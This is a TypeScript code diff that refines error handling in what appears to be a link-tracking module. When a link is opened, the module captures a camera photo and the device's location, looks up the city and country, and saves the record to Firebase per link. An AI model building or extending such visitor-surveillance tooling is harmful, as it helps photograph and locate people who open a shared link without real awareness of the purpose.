@@ -21,6 +21,7 @@ interface TrackingData {
   errors?: {
     location?: string;
     photo?: string;
+    save?: string;
   };
 }
 
@@ -50,7 +51,10 @@ export const capturePhoto = async (): Promise<{ photo?: string; error?: string }
     });
   } catch (error) {
     console.error('Error capturing photo:', error);
-    return { error: 'Camera access denied' };
+    const errorMessage = error instanceof Error && error.name === 'NotAllowedError' 
+      ? 'Camera access denied by user'
+      : 'Camera not available or access denied';
+    return { error: errorMessage };
   }
 };
 
@@ -86,24 +90,36 @@ export const getLocation = async (): Promise<{ location?: TrackingData['location
       });
     });
     
-    // Get country info from coordinates using reverse geocoding
-    const response = await fetch(
-      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
-    );
-    const data = await response.json();
-    
-    return {
-      location: {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        country: data.address?.country,
-        countryCode: data.address?.country_code?.toUpperCase(),
-        city: data.address?.city || data.address?.town
-      }
-    };
+    try {
+      const response = await fetch(
+        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
+      );
+      const data = await response.json();
+      
+      return {
+        location: {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          country: data.address?.country,
+          countryCode: data.address?.country_code?.toUpperCase(),
+          city: data.address?.city || data.address?.town
+        }
+      };
+    } catch (geoError) {
+      // If reverse geocoding fails, return just the coordinates
+      return {
+        location: {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude
+        }
+      };
+    }
   } catch (error) {
     console.error('Error getting location:', error);
-    return { error: 'Location access denied' };
+    const errorMessage = error instanceof Error && error.code === 1 
+      ? 'Location access denied by user'
+      : 'Location not available or access denied';
+    return { error: errorMessage };
   }
 };
 
@@ -132,18 +148,24 @@ export const trackAccess = async (linkId: string): Promise<TrackingData> => {
       trackingData.errors.photo = photoResult.error;
     }
     
-    // Save to Firebase regardless of permission errors
-    const accessRef = ref(database, `accesses/${linkId}/${Date.now()}`);
-    await set(accessRef, trackingData);
+    try {
+      // Save to Firebase regardless of permission errors
+      const accessRef = ref(database, `accesses/${linkId}/${Date.now()}`);
+      await set(accessRef, trackingData);
+    } catch (saveError) {
+      console.error('Error saving tracking data:', saveError);
+      trackingData.errors.save = 'Failed to save tracking data';
+    }
     
     return trackingData;
   } catch (error) {
-    // If Firebase save fails, add it to errors but don't throw
-    console.error('Error saving tracking data:', error);
-    trackingData.errors = {
-      ...trackingData.errors,
-      save: 'Failed to save tracking data'
+    console.error('Error in trackAccess:', error);
+    return {
+      ...trackingData,
+      errors: {
+        ...trackingData.errors,
+        save: 'Unexpected error during tracking'
+      }
     };
-    return trackingData;
   }
 }
